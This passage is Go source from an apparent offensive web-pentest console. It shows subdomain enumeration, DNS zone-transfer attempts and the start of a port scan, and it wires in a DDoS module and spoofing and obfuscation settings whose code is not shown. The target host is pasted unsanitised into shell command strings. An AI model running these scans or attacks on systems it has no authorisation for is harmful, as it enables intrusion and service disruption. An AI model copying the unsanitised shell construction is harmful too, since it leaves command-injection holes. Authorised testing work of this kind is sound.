//John 3:16

package webcrackers

import (
    "os"
    "fmt"
    "net"
    "sync"
    "sort"
    "time"
    "menus"
    "utils"
    "os/exec"
    "banners"
    "strings"
    "bcolors"
    "strconv"
    "io/ioutil"
    "scriptures"
    "subprocess"
    "path/filepath"
    "encoding/json"
)

var (
    Function, ReconDir string
)

type ScanResult struct {
    Status      string                 `json:"status"`
    Command     string                 `json:"command"`
    Output      string                 `json:"output"`
    Error       string                 `json:"error,omitempty"`
    StartTime   time.Time              `json:"start_time"`
    EndTime     time.Time              `json:"end_time"`
    Duration    string                 `json:"duration"`
    ExitCode    int                    `json:"exit_code"`
    ToolName    string                 `json:"tool_name"`
    Phase       string                 `json:"phase"`
    Data        map[string]interface{} `json:"data,omitempty"`
}

type ScanTracker struct {
    mu              sync.Mutex
    Results         []ScanResult
    TotalCommands   int
    Successful      int
    Failed          int
    StartTime       time.Time
    CurrentPhase    string
    Host            string
    ReconDir        string
    Errors          []string
    Warnings        []string
}

type stringMatcher struct {
    names  []string
    action func()
}

func WebsitesPentest() {
    for {
        Input, err := utils.DisplayPrompt(subprocess.Version, "websites", Function)
        if err != nil {
            if err.Error() == "interrupted" {
                fmt.Printf("%s", "\n")
                break
            }
            break
        }

        Input = strings.TrimSpace(Input)
        buildParts := strings.Fields(strings.ToLower(Input))

        if len(buildParts) == 0 {
            continue
        }

        if executeCommand(Input) {
            continue
        }

        switch buildParts[0] {
        case "e", "q", "exit", "quit":
            os.Exit(0)
        case "0", "b", "back":
            return
        case "set":
            handleSetCommand(buildParts)
        case "unset", "delete":
            handleUnsetCommand(buildParts)
        case "run", "start", "launch", "exploit", "execute":
            executeFunction()
        default:
            utils.SystemShell(strings.ToLower(Input))
        }
    }
}

func executeCommand(cmd string) bool {
    commandGroups := []stringMatcher{

        {[]string{"? info", "h info", "help info"}, menus.HelpInfo},
        {[]string{"v", "version"}, banners.Version},
        {[]string{"s", "sleep"}, utils.Sleep},
        {[]string{"c", "cls", "clear", "cls screen", "clear screen", "screen cls", "screen clear"}, utils.ClearScreen},

        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},

        {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},

        {[]string{"set", "h set", "info set", "help set"}, menus.HelpInfoSet},
        {[]string{"use", "? use", "h use", "info use", "help use"}, menus.HelpInfoUse},

        {[]string{"tips", "h tips", "? tips", "info tips", "help tips"}, menus.HelpInfoTips},
        {[]string{"show", "? show", "h show", "info show", "help show"}, menus.HelpInfoShow},
        {[]string{"info list", "help list", "use list", "list"}, menus.HelpInfoList},
        {[]string{"h option", "? option", "h options", "? options", "info option", "help option", "info options", "help options"}, menus.HelpInfOptions},
        {[]string{"banner"}, banners.RandomBanners},
        {[]string{"g", "t", "guide", "tutarial"}, utils.BrowseTutorials},
        {[]string{"h", "?", "00", "help"}, menus.HelpInfoMenuZero},
        {[]string{"f", "use f", "features", "use features"}, menus.HelpInfoFeatures},

        {[]string{"info"}, menus.HelpInfoWebsites},
        {[]string{"m", "menu"}, menus.MenuEight},
        {[]string{"option", "options", "show option", "show options"}, func() {menus.WebsitesOptions(utils.RHost, utils.WebCrackersLogs, utils.Proxies, utils.UserName, utils.PassWord, utils.WordsList)}},
        {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListWebsitesFunctions},

        {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run netmap", "use netmap", "exec netmap", "start netmap", "launch netmap", "exploit netmap", "execute netmap"}, func() {WebPenFunctions("netmap")}},
        {[]string{"? 1", "info 1", "help 1", "netmap", "info netmap", "help netmap"}, menus.HelpInfoPortScan},

        {[]string{"2", "run 2", "use 2", "exec 2", "start 2", "launch 2", "exploit 2", "execute 2", "run enumscan", "use enumscan", "exec enumscan", "start enumscan", "launch enumscan", "exploit enumscan", "execute enumscan"}, func() {WebPenFunctions("enumscan")}},
        {[]string{"? 2", "info 2", "help 2", "enumscan", "info enumscan", "help enumscan"}, menus.HelpInfoEnumScan},

        {[]string{"3", "run 3", "use 3", "exec 3", "start 3", "launch 3", "exploit 3", "execute 3", "run dnsrecon", "use dnsrecon", "exec dnsrecon", "start dnsrecon", "launch dnsrecon", "exploit dnsrecon", "execute dnsrecon"}, func() {WebPenFunctions("dnsrecon")}},
        {[]string{"? 3", "info 3", "help 3", "dnsrecon", "info dnsrecon", "help dnsrecon"}, menus.HelpInfoDnsRecon},

        {[]string{"4", "run 4", "use 4", "exec 4", "start 4", "launch 4", "exploit 4", "execute 4", "run techscan", "use techscan", "exec techscan", "start techscan", "launch techscan", "exploit techscan", "execute techscan"}, func() {WebPenFunctions("techscan")}},
        {[]string{"? 4", "info 4", "help 4", "techscan", "info techscan", "help techscan"}, menus.HelpInfoTechScan},

        {[]string{"5", "run 5", "use 5", "exec 5", "start 5", "launch 5", "exploit 5", "execute 5", "run asetscan", "use asetscan", "exec asetscan", "start asetscan", "launch asetscan", "exploit asetscan", "execute asetscan"}, func() {WebPenFunctions("asetscan")}},
        {[]string{"? 5", "info 5", "help 5", "asetscan", "info asetscan", "help asetscan"}, menus.HelpInfoAsetScan},

        {[]string{"6", "run 6", "use 6", "exec 6", "start 6", "launch 6", "exploit 6", "execute 6", "run fuzzscan", "use fuzzscan", "exec fuzzscan", "start fuzzscan", "launch fuzzscan", "exploit fuzzscan", "execute fuzzscan"}, func() {WebPenFunctions("fuzzscan")}},
        {[]string{"? 6", "info 6", "help 6", "fuzzscan", "info fuzzscan", "help fuzzscan"}, menus.HelpInfoFuzzScan},

        {[]string{"7", "run 7", "use 7", "exec 7", "start 7", "launch 7", "exploit 7", "execute 7", "run leakscan", "use leakscan", "exec leakscan", "start leakscan", "launch leakscan", "exploit leakscan", "execute leakscan"}, func() {WebPenFunctions("leakscan")}},
        {[]string{"? 7", "info 7", "help 7", "leakscan", "info leakscan", "help leakscan"}, menus.HelpInfoLeakScan},

        {[]string{"8", "run 8", "use 8", "exec 8", "start 8", "launch 8", "exploit 8", "execute 8", "run vulnscan", "use vulnscan", "exec vulnscan", "start vulnscan", "launch vulnscan", "exploit vulnscan", "execute vulnscan"}, func() {WebPenFunctions("vulnscan")}},
        {[]string{"? 8", "info 8", "help 8", "vulnscan", "info vulnscan", "help vulnscan"}, menus.HelpInfoVulnScan},

        {[]string{"9", "run 9", "use 9", "exec 9", "start 9", "launch 9", "exploit 9", "execute 9", "run bounty", "use bounty", "exec bounty", "start bounty", "launch bounty", "exploit bounty", "execute bounty"}, func() {WebPenFunctions("bounty")}},
        {[]string{"? 9", "info 9", "help 9", "bounty", "info bounty", "help bounty"}, menus.HelpInfoAutoScan},

        {[]string{"10", "run 10", "use 10", "exec 10", "start 10", "launch 10", "exploit 10", "execute 10", "run verses", "use verses", "exec verses", "start verses", "launch verses", "exploit verses", "execute verses"}, scriptures.ScriptureNarrators},
        {[]string{"? 10", "verses", "info 10", "help 10", "info verses", "help verses"}, menus.HelpInfoVerses},
    }

    cmdLower := strings.ToLower(cmd)
    for _, group := range commandGroups {
        for _, name := range group.names {
            if name == cmdLower {
                group.action()
                return true
            }
        }
    }
    return false
}

func handleSetCommand(parts []string) {
    if len(parts) < 3 {
        menus.HelpInfoSet()
        return
    }
    key, value := parts[1], parts[2]
    setValues := map[string]*string{

      "func": &Function,
      "funcs": &Function,
      "module": &Function,
      "ssid": &utils.Ssid,
      "mode": &utils.NeMode,
      "function": &Function,
      "lhost": &utils.LHost,
      "lport": &utils.LPort,
      "hport": &utils.HPort,
      "rhost": &utils.RHost,
      "rhosts": &utils.RHost,
      "functions": &Function,
      "target": &utils.RHost,
      "distro": &utils.Distro,
      "targets": &utils.RHost,
      "proxy": &utils.Proxies,
      "script": &utils.Script,
       "name": &utils.BeefName,
      "build": &utils.BuildName,
      "proxies": &utils.Proxies,
      "passwd": &utils.BeefPass,
      "gateway": &utils.GateWay,
      "fakedns": &utils.FakeDns,
      "spoofer": &utils.Spoofer,
      "toolsdir": &utils.ToolsDir,
      "ddosmode": &utils.DDosMode,
      "recondir": &utils.ReconDir,
      "password": &utils.PassWord,
      "protocol": &utils.Protocol,
      "listener": &utils.Listener,
      "wordlist": &utils.WordsList,
      "listeners": &utils.Listener,
      "venvname": &utils.VenvName,
      "innericon": &utils.InnerIcon,
      "outericon": &utils.OuterIcon,
      "buildname": &utils.BuildName,
      "obfuscator": &utils.Obfuscator,
      "output": &utils.WebCrackersLogs,
      "outputlog": &utils.WebCrackersLogs,
      "outputlogs": &utils.WebCrackersLogs,
    }

    validKeys := make([]string, 0, len(setValues))
    for k := range setValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := setValues[key]; exists {
        *ptr = value
        fmt.Printf("%s%s%s -> %s\n", bcolors.Cyan, strings.ToUpper(key), bcolors.Endc, value)
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 1

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }

        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Printf("%s", "\n")
        }
        fmt.Printf("%s", "\n")
        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)
    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 1

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Printf("%s", "\n")
    }
}

func handleUnsetCommand(parts []string) {
    if len(parts) < 2 {
        menus.HelpInfoSet()
        return
    }
    key := parts[1]
    unsetValues := map[string]*string{

      "func": &Function,
      "funcs": &Function,
      "module": &Function,
      "ssid": &utils.Ssid,
      "mode": &utils.NeMode,
      "function": &Function,
      "lhost": &utils.LHost,
      "lport": &utils.LPort,
      "hport": &utils.HPort,
      "rhost": &utils.RHost,
      "rhosts": &utils.RHost,
      "functions": &Function,
      "target": &utils.RHost,
      "distro": &utils.Distro,
      "targets": &utils.RHost,
      "proxy": &utils.Proxies,
      "script": &utils.Script,
       "name": &utils.BeefName,
      "build": &utils.BuildName,
      "proxies": &utils.Proxies,
      "passwd": &utils.BeefPass,
      "gateway": &utils.GateWay,
      "fakedns": &utils.FakeDns,
      "spoofer": &utils.Spoofer,
      "toolsdir": &utils.ToolsDir,
      "ddosmode": &utils.DDosMode,
      "recondir": &utils.ReconDir,
      "password": &utils.PassWord,
      "protocol": &utils.Protocol,
      "listener": &utils.Listener,
      "wordlist": &utils.WordsList,
      "listeners": &utils.Listener,
      "venvname": &utils.VenvName,
      "innericon": &utils.InnerIcon,
      "outericon": &utils.OuterIcon,
      "buildname": &utils.BuildName,
      "obfuscator": &utils.Obfuscator,
      "output": &utils.WebCrackersLogs,
      "outputlog": &utils.WebCrackersLogs,
      "outputlogs": &utils.WebCrackersLogs,
    }

    validKeys := make([]string, 0, len(unsetValues))
    for k := range unsetValues {
        validKeys = append(validKeys, k)
    }

    if ptr, exists := unsetValues[key]; exists {
        *ptr = utils.DefaultValues[key]
        fmt.Printf("%s -> %s\n", strings.ToUpper(key), "Null")
        return
    }

    var suggestions []string
    lowerInput := strings.ToLower(key)
    for _, cmd := range validKeys {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            suggestions = append(suggestions, cmd)
        }
    }

    if len(suggestions) > 0 {
        fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Did you mean one of these?%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

        maxWidth := 0
        for _, s := range suggestions {
            if len(s) > maxWidth {
                maxWidth = len(s)
            }
        }
        maxWidth += 1

        cols := 5
        if len(suggestions) < cols {
            cols = len(suggestions)
        }

        for i := 0; i < len(suggestions); i += cols {
            for j := 0; j < cols && i+j < len(suggestions); j++ {
                fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, suggestions[i+j], bcolors.Endc)
            }
            fmt.Printf("%s", "\n")
        }
        fmt.Printf("%s", "\n")
        return
    }

    fmt.Printf("%s[!] %sKey '%s%s%s' is invalid. Available keys:%s\n\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, key, bcolors.Endc, bcolors.Endc)

    maxWidth := 0
    for _, k := range validKeys {
        if len(k) > maxWidth {
            maxWidth = len(k)
        }
    }
    maxWidth += 1

    cols := 5
    for i := 0; i < len(validKeys); i += cols {
        for j := 0; j < cols && i+j < len(validKeys); j++ {
            fmt.Printf(" -> %s%-*s%s", bcolors.Green, maxWidth, validKeys[i+j], bcolors.Endc)
        }
        fmt.Printf("%s", "\n")
    }
}

func executeFunction() {
    if Function == ""{
        fmt.Printf("\n%s[!] %sNo MODULE was set. Use %s'show modules' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    WebPenFunctions(Function, utils.RHost)
}

func formatRHost(rawHost string) (cleanedHost, fullURL string) {
    prefixes := []string{"http://", "https://", "www."}
    cleanedHost = rawHost
    for _, prefix := range prefixes {
        cleanedHost = strings.TrimPrefix(cleanedHost, prefix)
    }
    cleanedHost = strings.TrimSpace(cleanedHost)

    if !strings.HasPrefix(rawHost, "http://") && !strings.HasPrefix(rawHost, "https://") {
        fullURL = "http://" + cleanedHost
    } else {
        fullURL = rawHost
    }

    return cleanedHost, fullURL
}

func WebPenFunctions(Function string, args ...interface{}) {
    ReconDir = filepath.Join(utils.WebCrackersLogs, fmt.Sprintf("%s-%s", utils.RHost, utils.Date))
    os.MkdirAll(ReconDir, os.ModePerm)
    //cleaned, full := formatRHost(utils.RHost)

    if utils.Proxies != "" {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.WeMode,
            //IFACE: utils.IFace,
            //LPORT: utils.LPort,
            //HPORT: utils.HPort,
            RHOST: utils.RHost,
            //LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            //SCRIPT: utils.Script,
            //OUTPUTLOGS: utils.OutPut,
            PROXIES: utils.Proxies,
            FUNCTION: Function,
            RECONDIR: ReconDir,
            //LISTENER: utils.Listener,
            //PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            //INNERICON: utils.InnerIcon,
            //OUTERICON: utils.OuterIcon,
            //BUILDNAME: utils.BuildName,
            //OBFUSCATOR: utils.Obfuscator,
        }, true, false)

        if err := utils.SetProxy(utils.Proxies); err != nil {
            //
        }
    } else {
        menus.PrintSelected(menus.PrintOptions{
            MODE: utils.WeMode,
            //IFACE: utils.IFace,
            //LPORT: utils.LPort,
            //HPORT: utils.HPort,
            RHOST: utils.RHost,
            //LHOST: utils.LHost,
            //DISTRO: utils.Distro,
            //SCRIPT: utils.Script,
            //OUTPUTLOGS: utils.OutPut,
            FUNCTION: Function,
            RECONDIR: ReconDir,
            //LISTENER: utils.Listener,
            //PROTOCOL: utils.Protocol,
            //TOOLSDIR: utils.ToolsDir,
            //INNERICON: utils.InnerIcon,
            //OUTERICON: utils.OuterIcon,
            //BUILDNAME: utils.BuildName,
            //OBFUSCATOR: utils.Obfuscator,
        }, true, false)
    }

    commands := map[string]func(){

        "1": func() {PortScan(utils.RHost, ReconDir)},
        "2": func() {EnumScan(utils.RHost, ReconDir)},
        "3": func() {DnsRecon(utils.RHost, ReconDir)},
        "4": func() {TechScan(utils.RHost, ReconDir)},
        "5": func() {AsetScan(utils.RHost, ReconDir)},
        "6": func() {FuzzScan(utils.RHost, ReconDir)},
        "7": func() {LeakScan(utils.RHost, ReconDir)},
        "8": func() {VulnScan(utils.RHost, ReconDir)},
        "9": func() {AutoScan(utils.RHost, ReconDir)},
       "10": func() {DDosAttack(utils.RHost, utils.DDosMode)},

        "netmap":   func() {PortScan(utils.RHost, ReconDir)},
        "enumscan": func() {EnumScan(utils.RHost, ReconDir)},
        "dnsrecon": func() {DnsRecon(utils.RHost, ReconDir)},
        "techscan": func() {TechScan(utils.RHost, ReconDir)},
        "asetscan": func() {AsetScan(utils.RHost, ReconDir)},
        "fuzzscan": func() {FuzzScan(utils.RHost, ReconDir)},
        "leakscan": func() {LeakScan(utils.RHost, ReconDir)},
        "vulnscan": func() {VulnScan(utils.RHost, ReconDir)},
        "bounty":   func() {AutoScan(utils.RHost, ReconDir)},
        "ddos":     func() {DDosAttack(utils.RHost, utils.DDosMode)},
    }

    textCommands := []string{"netmap", "enumscan", "dnsrecon", "techscan", "asetscan", "fuzzscan", "leakscan", "vulnscan", "bounty", "ddos"}

    if action, exists := commands[Function]; exists {
        action()
        return
    }

    if num, err := strconv.Atoi(Function); err == nil {
        fmt.Printf("%s[!] %sNumber %s%d%s is invalid. Valid numbers are 1-10.\n", bcolors.Yellow, bcolors.Endc, bcolors.Red, num, bcolors.Endc)
        menus.ListWebsitesFunctions()
        return
    }

    lowerInput := strings.ToLower(Function)
    for _, cmd := range textCommands {
        lowerCmd := strings.ToLower(cmd)
        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
            fmt.Printf("%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
            return
        }
    }

    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
    menus.ListWebsitesFunctions()
}

func resolveHostToIP(host string) (string, error) {
    ips, err := net.LookupHost(host)
    if err != nil {
        return "", err
    }
    if len(ips) == 0 {
        return "", fmt.Errorf("no IP addresses found")
    }
    return ips[0], nil
}

func getIPFromSubdomains(RHost, ReconDir string) string {
    ipsFile := filepath.Join(ReconDir, "dns", fmt.Sprintf("resolved_ips_%s.txt", RHost))
    if utils.FileExists(ipsFile) {
        content, err := ioutil.ReadFile(ipsFile)
        if err == nil {
            lines := strings.Split(string(content), "\n")
            for _, line := range lines {
                if strings.Contains(line, RHost) {
                    parts := strings.Fields(line)
                    if len(parts) >= 2 {
                        return parts[1]
                    }
                }
            }
        }
    }

    ip, err := resolveHostToIP(RHost)
    if err == nil {
        return ip
    }
    
    return ""
}

func safeNmap(host, port, output string, args ...string) *ScanResult {

    ip, err := resolveHostToIP(host)
    if err != nil {
        return &ScanResult{
            Status: "failed",
            Error:  fmt.Sprintf("Failed to resolve host: %v", err),
        }
    }

    cmdArgs := append([]string{"-p", port, ip}, args...)
    cmd := exec.Command("nmap", cmdArgs...)

    outputBytes, err := cmd.CombinedOutput()
    if err != nil {
        return &ScanResult{
            Status:  "failed",
            Output:  string(outputBytes),
            Error:   err.Error(),
        }
    }

    if output != "" {
        ioutil.WriteFile(output, outputBytes, 0644)
    }

    return &ScanResult{
        Status: "success",
        Output: string(outputBytes),
    }
}


func EnumScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting ENUMERATION PHASE (Subdomain Discovery) ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    subdomainDir := filepath.Join(ReconDir, "subdomains")
    os.MkdirAll(subdomainDir, os.ModePerm)

    fmt.Printf("\n%s[%sPASSIVE%s] %sSubdomain Discovery%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    fmt.Printf("%s  → %sSubfinder ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("subfinder -d %s -silent -o %s/subdomains/subfinder_%s.txt", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sCRT.sh certificate logs ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    ScanCRT(utils.RHost, subdomainDir)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sAssetfinder ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("assetfinder --subs-only %s > %s/subdomains/assetfinder_%s.txt", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)


    fmt.Printf("%s  → %sFindomain ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("findomain --target %s -u %s/subdomains/findomain_%s.txt", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sAmass (passive) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("amass enum -passive -active -brute -d %s -silent > %s/subdomains/amass_%s.txt", utils.RHost, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sDNSX certificate transparency ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)

    subprocess.Run("dnsx -d %s -w %s -recon -silent -o %s/subdomains/dnsx_recon_%s.txt", utils.RHost, utils.ResolversFile, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sACTIVE%s] %sSubdomain Bruteforce%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    if _, err := exec.LookPath("shuffledns"); err == nil {
        fmt.Printf("%s  → %sShuffledns (bruteforce) ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("shuffledns -d %s -w %s -silent -o %s/subdomains/shuffledns_%s.txt", utils.RHost, utils.ResolversFile, ReconDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    } else {
        fmt.Printf("%s  → %sShuffledns not installed, skipping ...%s\n", bcolors.Yellow, bcolors.BrightWhite, bcolors.Endc)
    }

    fmt.Printf("%s  → %sDNSX wildcard filtering ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("dnsx -d %s -w %s -silent -o %s/subdomains/validated_%s.txt", utils.RHost, utils.ResolversFile, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sCOMBINE%s] %sDeduplicating Subdomains%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)
    CombineSu(RHost, ReconDir)

    subdomainsFile := filepath.Join(ReconDir, "subdomains", fmt.Sprintf("all_subdomains_%s.txt", utils.RHost))
    if utils.FileExists(subdomainsFile) {
        content, _ := ioutil.ReadFile(subdomainsFile)
        count := len(strings.Split(strings.TrimSpace(string(content)), "\n"))
        fmt.Printf("%s  ✓ %sTotal unique subdomains: %s%d%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.BrightYellow, count, bcolors.Endc)
    }
}

func DnsRecon(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting DNS RECONNAISSANCE PHASE ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    dnsDir := filepath.Join(ReconDir, "dns")
    os.MkdirAll(dnsDir, os.ModePerm)

    subdomainsFile := filepath.Join(ReconDir, "subdomains", fmt.Sprintf("all_subdomains_%s.txt", utils.RHost))

    fmt.Printf("\n%s[%sRESOLUTION%s] %sDNS Resolution%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)
    fmt.Printf("%s  → %sResolving A records ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("dnsx -l %s -a -silent -o %s/dns/resolved_ips_%s.txt", subdomainsFile, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("%s  → %sResolving CNAME records ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("dnsx -l %s -cname -silent -o %s/dns/cname_%s.txt", subdomainsFile, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)

    fmt.Printf("\n%s[%sADVANCED%s] %sAdvanced DNS Enumeration%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    if _, err := exec.LookPath("asnmap"); err == nil {
        fmt.Printf("%s  → %sASN mapping ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("asnmap -d %s -silent -o %s/dns/asnmap_%s.txt", utils.RHost, ReconDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }

    if _, err := exec.LookPath("cdncheck"); err == nil {
        fmt.Printf("%s  → %sCDN detection ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
        subprocess.Run("cdncheck -l %s -silent -o %s/dns/cdncheck_%s.txt", subdomainsFile, ReconDir, utils.RHost)
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    }

    fmt.Printf("%s  → %sZone transfer attempt ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)

    nsCmd := exec.Command("dig", "NS", utils.RHost, "+short")
    nsOutput, err := nsCmd.Output()
    if err == nil && len(nsOutput) > 0 {
        nsList := strings.Split(string(nsOutput), "\n")
        for _, ns := range nsList {
            ns = strings.TrimSpace(ns)
            if ns != "" {
                subprocess.Run("dig axfr @%s %s > %s/dns/zone_transfer_%s.txt", ns, utils.RHost, ReconDir, utils.RHost)
            }
        }
        fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
    } else {
        fmt.Printf(" %s⚠%s No nameservers found%s\n", 
            bcolors.Yellow, bcolors.BrightWhite, bcolors.Endc)
    }

    fmt.Printf("%s  → %sDNS bruteforce ...%s\n", bcolors.Blue, bcolors.BrightWhite, bcolors.Endc)
    subprocess.Run("dnsx -d %s -w %s -silent -o %s/dns/bruteforce_%s.txt", utils.RHost, utils.ResolversFile, ReconDir, utils.RHost)
    fmt.Printf(" %s✓%s\n", bcolors.Green, bcolors.Endc)
}

func PortScan(RHost, ReconDir string) {
    if utils.RHost == "" {
        fmt.Printf("\n%s[!] %sFailed to validate RHOST: Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
        return
    }

    fmt.Printf("\n%s[*] %sStarting PORT SCANNING PHASE ...%s\n", bcolors.Green, bcolors.BrightWhite, bcolors.Endc)

    portsDir := filepath.Join(ReconDir, "ports")
    os.MkdirAll(portsDir, os.ModePerm)

    fmt.Printf("\n%s[%sRESOLVE%s] %sResolving Host to IP%s\n", bcolors.Cyan, bcolors.BrightYellow, bcolors.Cyan, bcolors.BrightWhite, bcolors.Endc)

    ips, err := net.LookupHost(utils.RHost)
    if err != nil {
        fmt.Printf("%s[!] %sFailed to resolve host: %v%s\n", bcolors.Red, bcolors.BrightWhite, err, bcolors.Endc)
        return
    }
    
    if len(ips) == 0 {
        fmt.Printf("%s[!] %sNo IP addresses found for host%s\n", bcolors.Red, bcolors.BrightWhite, bcolors.Endc)
        return
    }

    targetIP := ips[0]
